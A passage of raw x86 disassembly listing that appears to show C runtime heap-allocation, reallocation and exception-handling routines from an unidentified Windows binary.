  425224:	and    DWORD PTR [eax+edx*4+0x44],ebx
  425228:	dec    BYTE PTR [ecx]
  42522a:	jne    0x425252
  42522c:	mov    ecx,DWORD PTR [ebp+0x8]
  42522f:	and    DWORD PTR [ecx],ebx
  425231:	jmp    0x425252
  425233:	add    ecx,0xffffffe0
  425236:	shr    ebx,cl
  425238:	mov    ecx,DWORD PTR [ebp-0x8]
  42523b:	lea    ecx,[ecx+eax*1+0x4]
  42523f:	not    ebx
  425241:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  425248:	dec    BYTE PTR [ecx]
  42524a:	jne    0x425252
  42524c:	mov    ecx,DWORD PTR [ebp+0x8]
  42524f:	and    DWORD PTR [ecx+0x4],ebx
  425252:	mov    ecx,DWORD PTR [edi+0x8]
  425255:	mov    ebx,DWORD PTR [edi+0x4]
  425258:	mov    DWORD PTR [ecx+0x4],ebx
  42525b:	mov    ecx,DWORD PTR [edi+0x4]
  42525e:	mov    edi,DWORD PTR [edi+0x8]
  425261:	mov    DWORD PTR [ecx+0x8],edi
  425264:	mov    ecx,DWORD PTR [ebp+0x10]
  425267:	sub    ecx,esi
  425269:	add    DWORD PTR [ebp-0x4],ecx
  42526c:	cmp    DWORD PTR [ebp-0x4],0x0
  425270:	jle    0x42531b
  425276:	mov    edi,DWORD PTR [ebp-0x4]
  425279:	mov    ecx,DWORD PTR [ebp+0xc]
  42527c:	sar    edi,0x4
  42527f:	dec    edi
  425280:	cmp    edi,0x3f
  425283:	lea    ecx,[ecx+esi*1-0x4]
  425287:	jbe    0x42528c
  425289:	push   0x3f
  42528b:	pop    edi
  42528c:	mov    ebx,DWORD PTR [ebp-0xc]
  42528f:	lea    ebx,[ebx+edi*8]
  425292:	mov    DWORD PTR [ebp+0x10],ebx
  425295:	mov    ebx,DWORD PTR [ebx+0x4]
  425298:	mov    DWORD PTR [ecx+0x4],ebx
  42529b:	mov    ebx,DWORD PTR [ebp+0x10]
  42529e:	mov    DWORD PTR [ecx+0x8],ebx
  4252a1:	mov    DWORD PTR [ebx+0x4],ecx
  4252a4:	mov    ebx,DWORD PTR [ecx+0x4]
  4252a7:	mov    DWORD PTR [ebx+0x8],ecx
  4252aa:	mov    ebx,DWORD PTR [ecx+0x4]
  4252ad:	cmp    ebx,DWORD PTR [ecx+0x8]
  4252b0:	jne    0x425309
  4252b2:	mov    cl,BYTE PTR [edi+eax*1+0x4]
  4252b6:	mov    BYTE PTR [ebp+0x13],cl
  4252b9:	inc    cl
  4252bb:	cmp    edi,0x20
  4252be:	mov    BYTE PTR [edi+eax*1+0x4],cl
  4252c2:	jae    0x4252e0
  4252c4:	cmp    BYTE PTR [ebp+0x13],0x0
  4252c8:	jne    0x4252d8
  4252ca:	mov    ecx,edi
  4252cc:	mov    ebx,0x80000000
  4252d1:	shr    ebx,cl
  4252d3:	mov    ecx,DWORD PTR [ebp+0x8]
  4252d6:	or     DWORD PTR [ecx],ebx
  4252d8:	lea    eax,[eax+edx*4+0x44]
  4252dc:	mov    ecx,edi
  4252de:	jmp    0x425300
  4252e0:	cmp    BYTE PTR [ebp+0x13],0x0
  4252e4:	jne    0x4252f6
  4252e6:	lea    ecx,[edi-0x20]
  4252e9:	mov    ebx,0x80000000
  4252ee:	shr    ebx,cl
  4252f0:	mov    ecx,DWORD PTR [ebp+0x8]
  4252f3:	or     DWORD PTR [ecx+0x4],ebx
  4252f6:	lea    eax,[eax+edx*4+0xc4]
  4252fd:	lea    ecx,[edi-0x20]
  425300:	mov    edx,0x80000000
  425305:	shr    edx,cl
  425307:	or     DWORD PTR [eax],edx
  425309:	mov    edx,DWORD PTR [ebp+0xc]
  42530c:	mov    ecx,DWORD PTR [ebp-0x4]
  42530f:	lea    eax,[edx+esi*1-0x4]
  425313:	mov    DWORD PTR [eax],ecx
  425315:	mov    DWORD PTR [ecx+eax*1-0x4],ecx
  425319:	jmp    0x42531e
  42531b:	mov    edx,DWORD PTR [ebp+0xc]
  42531e:	lea    eax,[esi+0x1]
  425321:	mov    DWORD PTR [edx-0x4],eax
  425324:	mov    DWORD PTR [edx+esi*1-0x8],eax
  425328:	jmp    0x425469
  42532d:	xor    eax,eax
  42532f:	jmp    0x42546c
  425334:	jge    0x425469
  42533a:	mov    ebx,DWORD PTR [ebp+0xc]
  42533d:	sub    DWORD PTR [ebp+0x10],esi
  425340:	lea    ecx,[esi+0x1]
  425343:	mov    DWORD PTR [ebx-0x4],ecx
  425346:	lea    ebx,[ebx+esi*1-0x4]
  42534a:	mov    esi,DWORD PTR [ebp+0x10]
  42534d:	sar    esi,0x4
  425350:	dec    esi
  425351:	cmp    esi,0x3f
  425354:	mov    DWORD PTR [ebp+0xc],ebx
  425357:	mov    DWORD PTR [ebx-0x4],ecx
  42535a:	jbe    0x42535f
  42535c:	push   0x3f
  42535e:	pop    esi
  42535f:	test   BYTE PTR [ebp-0x4],0x1
  425363:	jne    0x4253e9
  425369:	mov    esi,DWORD PTR [ebp-0x4]
  42536c:	sar    esi,0x4
  42536f:	dec    esi
  425370:	cmp    esi,0x3f
  425373:	jbe    0x425378
  425375:	push   0x3f
  425377:	pop    esi
  425378:	mov    ecx,DWORD PTR [edi+0x4]
  42537b:	cmp    ecx,DWORD PTR [edi+0x8]
  42537e:	jne    0x4253c2
  425380:	cmp    esi,0x20
  425383:	mov    ebx,0x80000000
  425388:	jae    0x4253a3
  42538a:	mov    ecx,esi
  42538c:	shr    ebx,cl
  42538e:	lea    esi,[esi+eax*1+0x4]
  425392:	not    ebx
  425394:	and    DWORD PTR [eax+edx*4+0x44],ebx
  425398:	dec    BYTE PTR [esi]
  42539a:	jne    0x4253bf
  42539c:	mov    ecx,DWORD PTR [ebp+0x8]
  42539f:	and    DWORD PTR [ecx],ebx
  4253a1:	jmp    0x4253bf
  4253a3:	lea    ecx,[esi-0x20]
  4253a6:	shr    ebx,cl
  4253a8:	lea    ecx,[esi+eax*1+0x4]
  4253ac:	not    ebx
  4253ae:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  4253b5:	dec    BYTE PTR [ecx]
  4253b7:	jne    0x4253bf
  4253b9:	mov    ecx,DWORD PTR [ebp+0x8]
  4253bc:	and    DWORD PTR [ecx+0x4],ebx
  4253bf:	mov    ebx,DWORD PTR [ebp+0xc]
  4253c2:	mov    ecx,DWORD PTR [edi+0x8]
  4253c5:	mov    esi,DWORD PTR [edi+0x4]
  4253c8:	mov    DWORD PTR [ecx+0x4],esi
  4253cb:	mov    esi,DWORD PTR [edi+0x8]
  4253ce:	mov    ecx,DWORD PTR [edi+0x4]
  4253d1:	mov    DWORD PTR [ecx+0x8],esi
  4253d4:	mov    esi,DWORD PTR [ebp+0x10]
  4253d7:	add    esi,DWORD PTR [ebp-0x4]
  4253da:	mov    DWORD PTR [ebp+0x10],esi
  4253dd:	sar    esi,0x4
  4253e0:	dec    esi
  4253e1:	cmp    esi,0x3f
  4253e4:	jbe    0x4253e9
  4253e6:	push   0x3f
  4253e8:	pop    esi
  4253e9:	mov    ecx,DWORD PTR [ebp-0xc]
  4253ec:	lea    ecx,[ecx+esi*8]
  4253ef:	mov    edi,DWORD PTR [ecx+0x4]
  4253f2:	mov    DWORD PTR [ebx+0x8],ecx
  4253f5:	mov    DWORD PTR [ebx+0x4],edi
  4253f8:	mov    DWORD PTR [ecx+0x4],ebx
  4253fb:	mov    ecx,DWORD PTR [ebx+0x4]
  4253fe:	mov    DWORD PTR [ecx+0x8],ebx
  425401:	mov    ecx,DWORD PTR [ebx+0x4]
  425404:	cmp    ecx,DWORD PTR [ebx+0x8]
  425407:	jne    0x425460
  425409:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  42540d:	mov    BYTE PTR [ebp+0xf],cl
  425410:	inc    cl
  425412:	cmp    esi,0x20
  425415:	mov    BYTE PTR [esi+eax*1+0x4],cl
  425419:	jae    0x425437
  42541b:	cmp    BYTE PTR [ebp+0xf],0x0
  42541f:	jne    0x42542f
  425421:	mov    ecx,esi
  425423:	mov    edi,0x80000000
  425428:	shr    edi,cl
  42542a:	mov    ecx,DWORD PTR [ebp+0x8]
  42542d:	or     DWORD PTR [ecx],edi
  42542f:	lea    eax,[eax+edx*4+0x44]
  425433:	mov    ecx,esi
  425435:	jmp    0x425457
  425437:	cmp    BYTE PTR [ebp+0xf],0x0
  42543b:	jne    0x42544d
  42543d:	lea    ecx,[esi-0x20]
  425440:	mov    edi,0x80000000
  425445:	shr    edi,cl
  425447:	mov    ecx,DWORD PTR [ebp+0x8]
  42544a:	or     DWORD PTR [ecx+0x4],edi
  42544d:	lea    eax,[eax+edx*4+0xc4]
  425454:	lea    ecx,[esi-0x20]
  425457:	mov    edx,0x80000000
  42545c:	shr    edx,cl
  42545e:	or     DWORD PTR [eax],edx
  425460:	mov    eax,DWORD PTR [ebp+0x10]
  425463:	mov    DWORD PTR [ebx],eax
  425465:	mov    DWORD PTR [eax+ebx*1-0x4],eax
  425469:	xor    eax,eax
  42546b:	inc    eax
  42546c:	pop    edi
  42546d:	pop    esi
  42546e:	pop    ebx
  42546f:	leave  
  425470:	ret    
  425471:	push   ebp
  425472:	mov    ebp,esp
  425474:	sub    esp,0x14
  425477:	mov    ecx,DWORD PTR [ebp+0x8]
  42547a:	mov    eax,ds:0x45cefc
  42547f:	mov    edx,DWORD PTR ds:0x45cf00
  425485:	add    ecx,0x17
  425488:	and    ecx,0xfffffff0
  42548b:	push   ebx
  42548c:	mov    DWORD PTR [ebp-0x10],ecx
  42548f:	sar    ecx,0x4
  425492:	push   esi
  425493:	lea    eax,[eax+eax*4]
  425496:	push   edi
  425497:	dec    ecx
  425498:	cmp    ecx,0x20
  42549b:	lea    edi,[edx+eax*4]
  42549e:	mov    DWORD PTR [ebp-0x4],edi
  4254a1:	jge    0x4254ae
  4254a3:	or     esi,0xffffffff
  4254a6:	shr    esi,cl
  4254a8:	or     DWORD PTR [ebp-0x8],0xffffffff
  4254ac:	jmp    0x4254bb
  4254ae:	add    ecx,0xffffffe0
  4254b1:	or     eax,0xffffffff
  4254b4:	xor    esi,esi
  4254b6:	shr    eax,cl
  4254b8:	mov    DWORD PTR [ebp-0x8],eax
  4254bb:	mov    eax,ds:0x45cf08
  4254c0:	mov    ebx,eax
  4254c2:	mov    DWORD PTR [ebp-0xc],esi
  4254c5:	cmp    ebx,edi
  4254c7:	jmp    0x4254dd
  4254c9:	mov    ecx,DWORD PTR [ebx+0x4]
  4254cc:	mov    edi,DWORD PTR [ebx]
  4254ce:	and    ecx,DWORD PTR [ebp-0x8]
  4254d1:	and    edi,esi
  4254d3:	or     ecx,edi
  4254d5:	jne    0x4254e2
  4254d7:	add    ebx,0x14
  4254da:	cmp    ebx,DWORD PTR [ebp-0x4]
  4254dd:	mov    DWORD PTR [ebp+0x8],ebx
  4254e0:	jb     0x4254c9
  4254e2:	cmp    ebx,DWORD PTR [ebp-0x4]
  4254e5:	jne    0x42550b
  4254e7:	mov    ebx,edx
  4254e9:	jmp    0x4254fc
  4254eb:	mov    ecx,DWORD PTR [ebx+0x4]
  4254ee:	mov    edi,DWORD PTR [ebx]
  4254f0:	and    ecx,DWORD PTR [ebp-0x8]
  4254f3:	and    edi,esi
  4254f5:	or     ecx,edi
  4254f7:	jne    0x425503
  4254f9:	add    ebx,0x14
  4254fc:	cmp    ebx,eax
  4254fe:	mov    DWORD PTR [ebp+0x8],ebx
  425501:	jb     0x4254eb
  425503:	cmp    ebx,eax
  425505:	je     0x42559f
  42550b:	mov    DWORD PTR ds:0x45cf08,ebx
  425511:	mov    eax,DWORD PTR [ebx+0x10]
  425514:	mov    edx,DWORD PTR [eax]
  425516:	cmp    edx,0xffffffff
  425519:	mov    DWORD PTR [ebp-0x4],edx
  42551c:	je     0x425532
  42551e:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  425525:	mov    edi,DWORD PTR [eax+edx*4+0x44]
  425529:	and    ecx,DWORD PTR [ebp-0x8]
  42552c:	and    edi,esi
  42552e:	or     ecx,edi
  425530:	jne    0x425568
  425532:	mov    edx,DWORD PTR [eax+0xc4]
  425538:	and    edx,DWORD PTR [ebp-0x8]
  42553b:	and    DWORD PTR [ebp-0x4],0x0
  42553f:	lea    ecx,[eax+0x44]
  425542:	mov    esi,DWORD PTR [ecx]
  425544:	and    esi,DWORD PTR [ebp-0xc]
  425547:	or     edx,esi
  425549:	mov    esi,DWORD PTR [ebp-0xc]
  42554c:	jne    0x425565
  42554e:	mov    edx,DWORD PTR [ecx+0x84]
  425554:	and    edx,DWORD PTR [ebp-0x8]
  425557:	inc    DWORD PTR [ebp-0x4]
  42555a:	add    ecx,0x4
  42555d:	mov    edi,DWORD PTR [ecx]
  42555f:	and    edi,esi
  425561:	or     edx,edi
  425563:	je     0x42554e
  425565:	mov    edx,DWORD PTR [ebp-0x4]
  425568:	mov    ecx,edx
  42556a:	imul   ecx,ecx,0x204
  425570:	lea    ecx,[ecx+eax*1+0x144]
  425577:	mov    DWORD PTR [ebp-0xc],ecx
  42557a:	mov    ecx,DWORD PTR [eax+edx*4+0x44]
  42557e:	xor    edi,edi
  425580:	and    ecx,esi
  425582:	jne    0x4255f1
  425584:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  42558b:	and    ecx,DWORD PTR [ebp-0x8]
  42558e:	push   0x20
  425590:	pop    edi
  425591:	jmp    0x4255f1
  425593:	cmp    DWORD PTR [ebx+0x8],0x0
  425597:	jne    0x4255a4
  425599:	add    ebx,0x14
  42559c:	mov    DWORD PTR [ebp+0x8],ebx
  42559f:	cmp    ebx,DWORD PTR [ebp-0x4]
  4255a2:	jb     0x425593
  4255a4:	cmp    ebx,DWORD PTR [ebp-0x4]
  4255a7:	jne    0x4255cf
  4255a9:	mov    ebx,edx
  4255ab:	jmp    0x4255b6
  4255ad:	cmp    DWORD PTR [ebx+0x8],0x0
  4255b1:	jne    0x4255bd
  4255b3:	add    ebx,0x14
  4255b6:	cmp    ebx,eax
  4255b8:	mov    DWORD PTR [ebp+0x8],ebx
  4255bb:	jb     0x4255ad
  4255bd:	cmp    ebx,eax
  4255bf:	jne    0x4255cf
  4255c1:	call   0x424fd5
  4255c6:	mov    ebx,eax
  4255c8:	test   ebx,ebx
  4255ca:	mov    DWORD PTR [ebp+0x8],ebx
  4255cd:	je     0x4255e7
  4255cf:	push   ebx
  4255d0:	call   0x42508c
  4255d5:	pop    ecx
  4255d6:	mov    ecx,DWORD PTR [ebx+0x10]
  4255d9:	mov    DWORD PTR [ecx],eax
  4255db:	mov    eax,DWORD PTR [ebx+0x10]
  4255de:	cmp    DWORD PTR [eax],0xffffffff
  4255e1:	jne    0x42550b
  4255e7:	xor    eax,eax
  4255e9:	jmp    0x425768
  4255ee:	shl    ecx,1
  4255f0:	inc    edi
  4255f1:	test   ecx,ecx
  4255f3:	jge    0x4255ee
  4255f5:	mov    ecx,DWORD PTR [ebp-0xc]
  4255f8:	mov    edx,DWORD PTR [ecx+edi*8+0x4]
  4255fc:	mov    ecx,DWORD PTR [edx]
  4255fe:	sub    ecx,DWORD PTR [ebp-0x10]
  425601:	mov    esi,ecx
  425603:	sar    esi,0x4
  425606:	dec    esi
  425607:	cmp    esi,0x3f
  42560a:	mov    DWORD PTR [ebp-0x8],ecx
  42560d:	jle    0x425612
  42560f:	push   0x3f
  425611:	pop    esi
  425612:	cmp    esi,edi
  425614:	je     0x42571b
  42561a:	mov    ecx,DWORD PTR [edx+0x4]
  42561d:	cmp    ecx,DWORD PTR [edx+0x8]
  425620:	jne    0x42567e
  425622:	cmp    edi,0x20
  425625:	mov    ebx,0x80000000
  42562a:	jge    0x425652
  42562c:	mov    ecx,edi
  42562e:	shr    ebx,cl
  425630:	mov    ecx,DWORD PTR [ebp-0x4]
  425633:	lea    edi,[eax+edi*1+0x4]
  425637:	not    ebx
  425639:	mov    DWORD PTR [ebp-0x14],ebx
  42563c:	and    ebx,DWORD PTR [eax+ecx*4+0x44]
  425640:	mov    DWORD PTR [eax+ecx*4+0x44],ebx
  425644:	dec    BYTE PTR [edi]
  425646:	jne    0x42567b
  425648:	mov    ecx,DWORD PTR [ebp-0x14]
  42564b:	mov    ebx,DWORD PTR [ebp+0x8]
  42564e:	and    DWORD PTR [ebx],ecx
  425650:	jmp    0x42567e
  425652:	lea    ecx,[edi-0x20]
  425655:	shr    ebx,cl
  425657:	mov    ecx,DWORD PTR [ebp-0x4]
  42565a:	lea    ecx,[eax+ecx*4+0xc4]
  425661:	lea    edi,[eax+edi*1+0x4]
  425665:	not    ebx
  425667:	and    DWORD PTR [ecx],ebx
  425669:	dec    BYTE PTR [edi]
  42566b:	mov    DWORD PTR [ebp-0x14],ebx
  42566e:	jne    0x42567b
  425670:	mov    ebx,DWORD PTR [ebp+0x8]
  425673:	mov    ecx,DWORD PTR [ebp-0x14]
  425676:	and    DWORD PTR [ebx+0x4],ecx
  425679:	jmp    0x42567e
  42567b:	mov    ebx,DWORD PTR [ebp+0x8]
  42567e:	cmp    DWORD PTR [ebp-0x8],0x0
  425682:	mov    ecx,DWORD PTR [edx+0x8]
  425685:	mov    edi,DWORD PTR [edx+0x4]
  425688:	mov    DWORD PTR [ecx+0x4],edi
  42568b:	mov    ecx,DWORD PTR [edx+0x4]
  42568e:	mov    edi,DWORD PTR [edx+0x8]
  425691:	mov    DWORD PTR [ecx+0x8],edi
  425694:	je     0x425727
  42569a:	mov    ecx,DWORD PTR [ebp-0xc]
  42569d:	lea    ecx,[ecx+esi*8]
  4256a0:	mov    edi,DWORD PTR [ecx+0x4]
  4256a3:	mov    DWORD PTR [edx+0x8],ecx
  4256a6:	mov    DWORD PTR [edx+0x4],edi
  4256a9:	mov    DWORD PTR [ecx+0x4],edx
  4256ac:	mov    ecx,DWORD PTR [edx+0x4]
  4256af:	mov    DWORD PTR [ecx+0x8],edx
  4256b2:	mov    ecx,DWORD PTR [edx+0x4]
  4256b5:	cmp    ecx,DWORD PTR [edx+0x8]
  4256b8:	jne    0x425718
  4256ba:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  4256be:	mov    BYTE PTR [ebp+0xb],cl
  4256c1:	inc    cl
  4256c3:	cmp    esi,0x20
  4256c6:	mov    BYTE PTR [esi+eax*1+0x4],cl
  4256ca:	jge    0x4256ef
  4256cc:	cmp    BYTE PTR [ebp+0xb],0x0
  4256d0:	jne    0x4256dd
  4256d2:	mov    edi,0x80000000
  4256d7:	mov    ecx,esi
  4256d9:	shr    edi,cl
  4256db:	or     DWORD PTR [ebx],edi
  4256dd:	mov    ecx,esi
  4256df:	mov    edi,0x80000000
  4256e4:	shr    edi,cl
  4256e6:	mov    ecx,DWORD PTR [ebp-0x4]
  4256e9:	or     DWORD PTR [eax+ecx*4+0x44],edi
  4256ed:	jmp    0x425718
  4256ef:	cmp    BYTE PTR [ebp+0xb],0x0
  4256f3:	jne    0x425702
  4256f5:	lea    ecx,[esi-0x20]
  4256f8:	mov    edi,0x80000000
  4256fd:	shr    edi,cl
  4256ff:	or     DWORD PTR [ebx+0x4],edi
  425702:	mov    ecx,DWORD PTR [ebp-0x4]
  425705:	lea    edi,[eax+ecx*4+0xc4]
  42570c:	lea    ecx,[esi-0x20]
  42570f:	mov    esi,0x80000000
  425714:	shr    esi,cl
  425716:	or     DWORD PTR [edi],esi
  425718:	mov    ecx,DWORD PTR [ebp-0x8]
  42571b:	test   ecx,ecx
  42571d:	je     0x42572a
  42571f:	mov    DWORD PTR [edx],ecx
  425721:	mov    DWORD PTR [ecx+edx*1-0x4],ecx
  425725:	jmp    0x42572a
  425727:	mov    ecx,DWORD PTR [ebp-0x8]
  42572a:	mov    esi,DWORD PTR [ebp-0x10]
  42572d:	add    edx,ecx
  42572f:	lea    ecx,[esi+0x1]
  425732:	mov    DWORD PTR [edx],ecx
  425734:	mov    DWORD PTR [edx+esi*1-0x4],ecx
  425738:	mov    esi,DWORD PTR [ebp-0xc]
  42573b:	mov    ecx,DWORD PTR [esi]
  42573d:	test   ecx,ecx
  42573f:	lea    edi,[ecx+0x1]
  425742:	mov    DWORD PTR [esi],edi
  425744:	jne    0x425760
  425746:	cmp    ebx,DWORD PTR ds:0x45cef8
  42574c:	jne    0x425760
  42574e:	mov    ecx,DWORD PTR [ebp-0x4]
  425751:	cmp    ecx,DWORD PTR ds:0x45cf10
  425757:	jne    0x425760
  425759:	and    DWORD PTR ds:0x45cef8,0x0
  425760:	mov    ecx,DWORD PTR [ebp-0x4]
  425763:	mov    DWORD PTR [eax],ecx
  425765:	lea    eax,[edx+0x4]
  425768:	pop    edi
  425769:	pop    esi
  42576a:	pop    ebx
  42576b:	leave  
  42576c:	ret    
  42576d:	int3   
  42576e:	int3   
  42576f:	int3   
  425770:	push   esi
  425771:	inc    ebx
  425772:	xor    dh,BYTE PTR [eax]
  425774:	pop    eax
  425775:	inc    ebx
  425776:	xor    BYTE PTR [eax],dh
  425778:	push   ebp
  425779:	mov    ebp,esp
  42577b:	sub    esp,0x8
  42577e:	push   ebx
  42577f:	push   esi
  425780:	push   edi
  425781:	push   ebp
  425782:	cld    
  425783:	mov    ebx,DWORD PTR [ebp+0xc]
  425786:	mov    eax,DWORD PTR [ebp+0x8]
  425789:	test   DWORD PTR [eax+0x4],0x6
  425790:	jne    0x425818
  425796:	mov    DWORD PTR [ebp-0x8],eax
  425799:	mov    eax,DWORD PTR [ebp+0x10]
  42579c:	mov    DWORD PTR [ebp-0x4],eax
  42579f:	lea    eax,[ebp-0x8]
  4257a2:	mov    DWORD PTR [ebx-0x4],eax
  4257a5:	mov    esi,DWORD PTR [ebx+0xc]
  4257a8:	mov    edi,DWORD PTR [ebx+0x8]
  4257ab:	cmp    esi,0xffffffff
  4257ae:	je     0x425811
  4257b0:	lea    ecx,[esi+esi*2]
  4257b3:	cmp    DWORD PTR [edi+ecx*4+0x4],0x0
  4257b8:	je     0x4257ff
  4257ba:	push   esi
  4257bb:	push   ebp
  4257bc:	lea    ebp,[ebx+0x10]
  4257bf:	call   DWORD PTR [edi+ecx*4+0x4]
  4257c3:	pop    ebp
  4257c4:	pop    esi
  4257c5:	mov    ebx,DWORD PTR [ebp+0xc]
  4257c8:	or     eax,eax
  4257ca:	je     0x4257ff
  4257cc:	js     0x42580a
  4257ce:	mov    edi,DWORD PTR [ebx+0x8]
  4257d1:	push   ebx
  4257d2:	call   0x426700
  4257d7:	add    esp,0x4
  4257da:	lea    ebp,[ebx+0x10]
  4257dd:	push   esi
  4257de:	push   ebx
  4257df:	call   0x426742
  4257e4:	add    esp,0x8
  4257e7:	lea    ecx,[esi+esi*2]
  4257ea:	push   0x1
  4257ec:	mov    eax,DWORD PTR [edi+ecx*4+0x8]
  4257f0:	call   0x4267d6
  4257f5:	mov    eax,DWORD PTR [edi+ecx*4]
  4257f8:	mov    DWORD PTR [ebx+0xc],eax
  4257fb:	call   DWORD PTR [edi+ecx*4+0x8]
  4257ff:	mov    edi,DWORD PTR [ebx+0x8]
  425802:	lea    ecx,[esi+esi*2]
  425805:	mov    esi,DWORD PTR [edi+ecx*4]
  425808:	jmp    0x4257ab
  42580a:	mov    eax,0x0
  42580f:	jmp    0x42582d
  425811:	mov    eax,0x1
  425816:	jmp    0x42582d
  425818:	push   ebp
  425819:	lea    ebp,[ebx+0x10]
  42581c:	push   0xffffffff
  42581e:	push   ebx
  42581f:	call   0x426742
  425824:	add    esp,0x8
  425827:	pop    ebp
  425828:	mov    eax,0x1
  42582d:	pop    ebp
  42582e:	pop    edi
  42582f:	pop    esi
  425830:	pop    ebx
  425831:	mov    esp,ebp
  425833:	pop    ebp
  425834:	ret    
  425835:	push   ebp
  425836:	mov    ecx,DWORD PTR [esp+0x8]
  42583a:	mov    ebp,DWORD PTR [ecx]
  42583c:	mov    eax,DWORD PTR [ecx+0x1c]
  42583f:	push   eax
  425840:	mov    eax,DWORD PTR [ecx+0x18]
  425843:	push   eax
  425844:	call   0x426742
  425849:	add    esp,0x8
  42584c:	pop    ebp
  42584d:	ret    0x4
  425850:	call   0x42375d
  425855:	add    eax,0x8
  425858:	ret    
  425859:	push   0x14
  42585b:	push   0x428770
  425860:	call   0x4238a8
  425865:	mov    edi,DWORD PTR [ebp+0x8]
  425868:	xor    ebx,ebx
  42586a:	cmp    edi,ebx
  42586c:	jne    0x42587c
  42586e:	push   DWORD PTR [ebp+0xc]
  425871:	call   0x4245d2
  425876:	pop    ecx
  425877:	jmp    0x425a00
  42587c:	mov    esi,DWORD PTR [ebp+0xc]
  42587f:	cmp    esi,ebx
  425881:	jne    0x42588f
  425883:	push   edi
  425884:	call   0x4244ba
  425889:	pop    ecx
  42588a:	jmp    0x4259fe
  42588f:	cmp    DWORD PTR ds:0x45d144,0x3
  425896:	jne    0x4259ca
  42589c:	mov    DWORD PTR [ebp-0x1c],ebx
  42589f:	cmp    esi,0xffffffe0
  4258a2:	ja     0x425999
  4258a8:	push   0x4
  4258aa:	call   0x423a6f
  4258af:	pop    ecx
  4258b0:	mov    DWORD PTR [ebp-0x4],ebx
  4258b3:	push   edi
  4258b4:	call   0x424c92
  4258b9:	pop    ecx
  4258ba:	mov    DWORD PTR [ebp-0x20],eax
  4258bd:	cmp    eax,ebx
  4258bf:	je     0x425969
  4258c5:	cmp    esi,DWORD PTR ds:0x45cf04
  4258cb:	ja     0x425919
  4258cd:	push   esi
  4258ce:	push   edi
  4258cf:	push   eax
  4258d0:	call   0x425192
  4258d5:	add    esp,0xc
  4258d8:	test   eax,eax
  4258da:	je     0x4258e1
  4258dc:	mov    DWORD PTR [ebp-0x1c],edi
  4258df:	jmp    0x425919
  4258e1:	push   esi
  4258e2:	call   0x425471
  4258e7:	pop    ecx
  4258e8:	mov    DWORD PTR [ebp-0x1c],eax
  4258eb:	cmp    eax,ebx
  4258ed:	je     0x425919
  4258ef:	mov    eax,DWORD PTR [edi-0x4]
  4258f2:	dec    eax
  4258f3:	mov    DWORD PTR [ebp-0x24],eax
  4258f6:	cmp    eax,esi
  4258f8:	jb     0x4258fc
  4258fa:	mov    eax,esi
  4258fc:	push   eax
  4258fd:	push   edi
  4258fe:	push   DWORD PTR [ebp-0x1c]
  425901:	call   0x4245f0
  425906:	push   edi
  425907:	call   0x424c92
  42590c:	mov    DWORD PTR [ebp-0x20],eax
  42590f:	push   edi
  425910:	push   eax
  425911:	call   0x424cbd
  425916:	add    esp,0x18
  425919:	cmp    DWORD PTR [ebp-0x1c],ebx
  42591c:	jne    0x425969
  42591e:	cmp    esi,ebx
  425920:	jne    0x425928
  425922:	xor    esi,esi
  425924:	inc    esi
  425925:	mov    DWORD PTR [ebp+0xc],esi
  425928:	add    esi,0xf
  42592b:	and    esi,0xfffffff0
  42592e:	mov    DWORD PTR [ebp+0xc],esi
  425931:	push   esi
  425932:	push   ebx
  425933:	push   DWORD PTR ds:0x45d140
  425939:	call   DWORD PTR ds:0x4280a8
  42593f:	mov    DWORD PTR [ebp-0x1c],eax
  425942:	cmp    eax,ebx
  425944:	je     0x425969
  425946:	mov    eax,DWORD PTR [edi-0x4]
  425949:	dec    eax
  42594a:	mov    DWORD PTR [ebp-0x24],eax
  42594d:	cmp    eax,esi
  42594f:	jb     0x425953
  425951:	mov    eax,esi
  425953:	push   eax
  425954:	push   edi
  425955:	push   DWORD PTR [ebp-0x1c]
  425958:	call   0x4245f0
  42595d:	push   edi
  42595e:	push   DWORD PTR [ebp-0x20]
  425961:	call   0x424cbd
  425966:	add    esp,0x14
  425969:	or     DWORD PTR [ebp-0x4],0xffffffff
  42596d:	call   0x4259c1
  425972:	cmp    DWORD PTR [ebp-0x20],ebx
  425975:	jne    0x425999
  425977:	cmp    esi,ebx
  425979:	jne    0x42597e
  42597b:	xor    esi,esi
  42597d:	inc    esi
  42597e:	add    esi,0xf
  425981:	and    esi,0xfffffff0
  425984:	mov    DWORD PTR [ebp+0xc],esi
  425987:	push   esi
  425988:	push   edi
  425989:	push   ebx
  42598a:	push   DWORD PTR ds:0x45d140
  425990:	call   DWORD PTR ds:0x4280b4
  425996:	mov    DWORD PTR [ebp-0x1c],eax
  425999:	mov    eax,DWORD PTR [ebp-0x1c]
  42599c:	cmp    eax,ebx
  42599e:	jne    0x425a00
  4259a0:	cmp    DWORD PTR ds:0x45cdc8,ebx
  4259a6:	je     0x425a00
  4259a8:	push   esi
  4259a9:	call   0x426192
  4259ae:	pop    ecx
  4259af:	test   eax,eax
  4259b1:	jne    0x42589c
  4259b7:	jmp    0x4259fe
  4259b9:	xor    ebx,ebx
  4259bb:	mov    esi,DWORD PTR [ebp+0xc]
  4259be:	mov    edi,DWORD PTR [ebp+0x8]
  4259c1:	push   0x4
  4259c3:	call   0x4239db
  4259c8:	pop    ecx
  4259c9:	ret    
  4259ca:	xor    eax,eax
  4259cc:	cmp    esi,0xffffffe0
  4259cf:	ja     0x4259e7
  4259d1:	cmp    esi,ebx
  4259d3:	jne    0x4259d8
  4259d5:	xor    esi,esi
  4259d7:	inc    esi
  4259d8:	push   esi
  4259d9:	push   edi
  4259da:	push   ebx
  4259db:	push   DWORD PTR ds:0x45d140
  4259e1:	call   DWORD PTR ds:0x4280b4
  4259e7:	cmp    eax,ebx
  4259e9:	jne    0x425a00
  4259eb:	cmp    DWORD PTR ds:0x45cdc8,ebx
  4259f1:	je     0x425a00
  4259f3:	push   esi
  4259f4:	call   0x426192
  4259f9:	pop    ecx
  4259fa:	test   eax,eax
  4259fc:	jne    0x4259ca
  4259fe:	xor    eax,eax
  425a00:	call   0x4238e3
  425a05:	ret    
  425a06:	push   0x10
  425a08:	push   0x428780
  425a0d:	call   0x4238a8
  425a12:	cmp    DWORD PTR ds:0x45d144,0x3
  425a19:	jne    0x425a55
  425a1b:	push   0x4
  425a1d:	call   0x423a6f
  425a22:	pop    ecx
  425a23:	and    DWORD PTR [ebp-0x4],0x0
